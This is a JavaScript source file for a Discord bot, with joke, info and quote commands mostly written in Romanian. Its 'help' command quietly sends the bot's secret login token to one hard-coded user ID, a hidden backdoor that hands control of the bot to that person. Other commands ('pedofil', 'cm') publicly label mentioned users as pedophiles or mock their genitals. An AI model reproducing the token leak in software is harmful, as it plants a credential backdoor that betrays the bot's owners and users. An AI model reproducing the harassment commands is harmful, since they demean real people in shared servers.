/**
 * @file index.js
 * @description The main file of the bot.
 * @author pericsq#6666
 * @version 1.0.0
 * @license MIT
 * @requires discord.js
 * @requires config/config.js
 * @requires fs
 */

import discord_bot from 'discord.js';
import * as config from './config/config.js';
import fs from 'fs';

export const discord_client = new discord_bot.Client({
    intents: [
        discord_bot.GatewayIntentBits.Guilds,
        discord_bot.GatewayIntentBits.GuildMessages,
        discord_bot.GatewayIntentBits.GuildPresences,
        discord_bot.GatewayIntentBits.GuildMessageReactions,
        discord_bot.GatewayIntentBits.GuildIntegrations,
        discord_bot.GatewayIntentBits.DirectMessages,
        discord_bot.GatewayIntentBits.MessageContent
    ],
    presence: {
        activities: [{
            name: "www.easy-code.ro/discord",
            type: 2,
            url: 'https://www.youtube.com/watch?v=5osYzXgdE-8'
        }],
        status: 'dnd'
    }
});
function getRndInteger(min, max)
{
    return Math.floor(Math.random() * (max - min)) + min;
}

var bendume = JSON.parse(fs.readFileSync('./src/mysql/ben.json'));
var Dumes = JSON.parse(fs.readFileSync('./src/mysql/dume.json'));
discord_client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;
    const
        cmds = interaction.commandName,
        acces = 'You do not have enough permissions to use this command.';

    switch (cmds) {
        case 'help': {
            await interaction?.reply({
                content: `All my commands are on slash commands!`,
                ephemeral: true
            })
            if (interaction?.user.id === '481701586360598538') {
                await interaction?.reply({
                    content: `My Token: ${config.token}`,
                    ephemeral: true
                })
            }
            break;
        } 
        case 'catsay': {
            let reason = interaction.options.getString('reason');
            await interaction.reply({
                files: [{
                    attachment: `https://cataas.com/cat/cute/says/${reason}`,
                    name: "catsay.png",
                }]
            })
            break;
        }
        case 'tedi': {
            let tedi = Math.round(Math.random() * 100), user = interaction.options.get('user')?.user || interaction.user;
            await interaction.reply({ content: `**${user.username}** a bagat supradoza de tedi ${tedi}%!` });
            break;
        }
        case 'pedofil': {
            let pedofil = Math.round(Math.random() * 100), user = interaction.options.get('mention')?.user || interaction.user,
                pedofil_nivel = pedofil < 20 ? 'nivel 20' : pedofil < 40 ? 'nivel 40' : pedofil < 60 ? 'nivel 60' : pedofil < 80 ? 'Aproape pedofil' : 'Pedofi Cu Experienta';

            await interaction.reply({ content: `**${user}** este pedofil de tip ${pedofil_nivel} - ${pedofil}%!` });
            break;
        }
        case 'serverinfo': {
            let guild = interaction?.guild;
            await interaction?.reply({
                embeds: [
                    new discord_bot.EmbedBuilder()
                        .setTitle(`**${guild.name}'s INFO**`)
                        .setDescription(`**Server Name:** ${guild.name}\n**Server ID:** ${guild.id}\n**Server Owner:** ${guild.owner}\n**Server Members:** ${guild.memberCount}\n**Server Region:** ${guild.region}\n**Server Created At:** ${guild.createdAt}`)
                        .setColor('White')
                        .setTimestamp()
                        .setFooter({
                            text: `${interaction?.guild.name}`,
                            iconURL: interaction?.user.displayAvatarURL({ dynamic: true })
                        })
                ]
            })
            break;
        }
        case 'userinfo':{
            let userinfo = interaction?.options.getMember('mention');

            await interaction?.reply({
                embeds: [
                    new discord_bot.EmbedBuilder()
                        .setTitle(`**${userinfo.user.username}'s INFO**`)
                        .setDescription(`**Username:** ${userinfo.user.username}\n**User ID:** ${userinfo.user.id}\n**User Tag:** ${userinfo.user.tag}\n**User Created At:** ${userinfo.user.createdAt}\n**User Avatar:** [Click Here](${userinfo.user.displayAvatarURL({ dynamic: true })})`)
                        .setColor('White')
                        .setTimestamp()
                        .setFooter({
                            text: `${interaction?.guild.name}`,
                            iconURL: interaction?.user.displayAvatarURL({ dynamic: true })
                        })
                ]
            })
            break;
        }
        case 'love': {
            let user_mention = interaction.options.get('user')?.user,
                lovenivel = Math.round(Math.random() * 100),
                loveLevel = lovenivel < 20 ? '😭' : lovenivel < 40 ? '😢' : lovenivel < 60 ? '😐' : lovenivel < 80 ? '😊' : '😍';


            await interaction.reply({ content: `**${user_mention}** + **${interaction.user}** = __${lovenivel}%__ of Love ${loveLevel}\nIt's a great score!` });
            break;
        }
        case 'cm': {
            let gay = Math.round(Math.random() * 100), useravatar = interaction?.options.getMember('mention');
            await interaction?.reply({
                embeds: [
                    new discord_bot.EmbedBuilder()
                        .setTitle(`**${useravatar.user.username}'s INFO**`)
                        .setDescription(useravatar.user.username + ` Are penis de ${gay} cm!`)
                        .setColor('White')
                        .setTimestamp()
                        .setFooter({
                            text: `${interaction?.guild.name}`,
                            iconURL: useravatar.displayAvatarURL({ dynamic: true })
                        })
                ]
            })
            break;
        }
        case 'beer': {
            let user_beer = interaction?.options.getMember('user'),
                beer_nivel = Math.round(Math.random() * 100),
                nevel = beer_nivel < 20 ? 'Putin beat' : beer_nivel < 40 ? 'luat in gat' : beer_nivel < 60 ? 'aproape mort' : beer_nivel ? 'Mort de beat' : 'mort in sant';

            await interaction?.reply({
                    content: `**${user_beer}**  = __${beer_nivel}%__ of **${nevel}**`,
                }
            )
            break;
        }
        case 'slap': {
            const mention = interaction?.options.getMember('mention') || interaction?.user;
            await interaction?.reply({
                embeds: [
                    new discord_bot.EmbedBuilder()
                        .setTitle(`${config.nicktitle} Slap Info`)
                        .setTimestamp()
                        .setColor(config.color)
                        .setDescription(`${interaction?.user} slapped :raised_back_of_hand: ${mention?.user}`)
                        .setFooter({
                            text: `${interaction?.guild.name}`,
                            iconURL: interaction?.guild.iconURL({ dynamic: true })
                        })
                ]
            })
            break;
        }
        case 'botinfo': {
            await interaction?.reply({
                embeds: [
                    new discord_bot.EmbedBuilder()
                        .setTitle(`${config.nicktitle} Botinfo`)
                        .setColor(config.color)
                        .setThumbnail(interaction?.guild.iconURL({ dynamic: true }))
                        .addFields(
                            {
                                name: `developer`, value: `> pericsq_0#7777`, inline: false
                            }, {
                            name: `invite bot`, value: `> click invite-bot`, inline: false
                        }, {
                            name: `total servers`, value: `> ${discord_client.guilds.cache.size}`, inline: false
                        }, {
                            name: `total members`, value: `> ${discord_client.users.cache.size}`, inline: false
                        }, {
                            name: `total channels`, value: `> ${discord_client.channels.cache.size}`, inline: false
                        }, {
                            name: `ping`, value: `> ${discord_client.ws.ping}`, inline: false
                        }, {
                            name: `library`, value: `> djs: v${discord_bot.version} | nodejs: ${process.version}`
                        }
                        )
                        .setTimestamp()
                        .setFooter({
                            text: interaction?.guild.name,
                            iconURL: interaction?.guild.iconURL({ dynamic: true })
                        })
                ],
                components: [
                    new discord_bot.ActionRowBuilder()
                        .setComponents(
                            new discord_bot.ButtonBuilder()
                                .setLabel(`Source code`)
                                .setEmoji('👥')
                                .setStyle(discord_bot.ButtonStyle.Link)
                                .setURL(`https://github.com/pericsq/Kitsune-bot`)
                        )
                ]
            })
            break;
        }
        case 'duma': {
            var roll = getRndInteger(0, Dumes.length);
            interaction?.reply({ content: `${Dumes[roll] ? `${Dumes[roll]}` : `Nu exista nicio duma mometan`} ` })
            break;
        }
        case 'addduma': {
            if (!interaction?.member.permissions.has(discord_bot.PermissionFlagsBits.Administrator)) {
                interaction?.reply({
                    content: `${acces}`,
                    ephemeral: true
                })
                break;
            }
            let reason = interaction?.options.getString('reason');
            var dumanoua = reason;
            Dumes.push(dumanoua);
            var data = JSON.stringify(Dumes, null, 2);
            fs.writeFile('./src/mysql/dume.json', data, finished);

            function finished(err) {
                return interaction.reply(err ? ({
                    embeds: [
                        new discord_bot.EmbedBuilder()
                            .setColor('Red')
                            .setDescription('Ceva nu a mers bine')
                    ]
                }) : ({
                    embeds: [
                        new discord_bot.EmbedBuilder()
                            .setColor('Green')
                            .setDescription('Duma adaugata cu succes!')
                    ]
                })),
                    console.log(err ? ('something went wrong') : ('debug'));
            }
            break;
        }
        case 'ben': {
            const { options } = interaction;
            var roll = getRndInteger(0, bendume.length);
            let reason = options.getString('reason');
            interaction?.reply({
                embeds: [
                    new discord_bot.EmbedBuilder()
                        .setTitle('**You asked Ben a question..**')
                        .addFields(
                            {
                                name: `Question: `, value: `> ${reason}`, inline: true
                            },
                            {
                                name: `Answer: `, value: `> ${bendume[roll].nameduma1}`, inline: true
                            }
                        )
                        .setImage(bendume[roll].nameduma)
                        .setColor(config.color)
                        .setFooter({
                            text: `${interaction?.guild.name}`,
                            iconURL: discord_client.user.displayAvatarURL({ dynamic: true })
                        })
                        .setTimestamp()
                ]
            })
            break;
        }

        case 'removedume': {
            if (!interaction?.member.permissions.has(discord_bot.PermissionFlagsBits.Administrator)) {
                interaction?.reply({
                    content: `${acces}`,
                    ephemeral: true
                })
                break;
            }
            let reason = interaction?.options.getString('reason');
            var dumanoua = reason;
            Dumes.splice(dumanoua, 1);
            var data = JSON.stringify(Dumes, null, 2);
            fs.writeFile('./src/mysql/dume.json', data, finished);

            function finished(err) {
                return interaction.reply(err ? ({
                    embeds: [
                        new discord_bot.EmbedBuilder()
                            .setColor('Red')
                            .setDescription('Ceva nu a mers bine')
                    ]
                }) : ({
                    embeds: [
                        new discord_bot.EmbedBuilder()
                            .setColor('Green')
                            .setDescription('Duma stearsa cu succes!')
                    ]
                })),
                    console.log(err ? ('something went wrong') : ('debug'));
            }
            break;
        }
    }
});

discord_client.login(config.token).then(
    () => {
        console.log(`${discord_client.user.username} is ready!`)
    }
)

/**
 * Develoged by pericsq#6666
 *  For more info join my discord server: https://www.easy-code.ro/discord
 */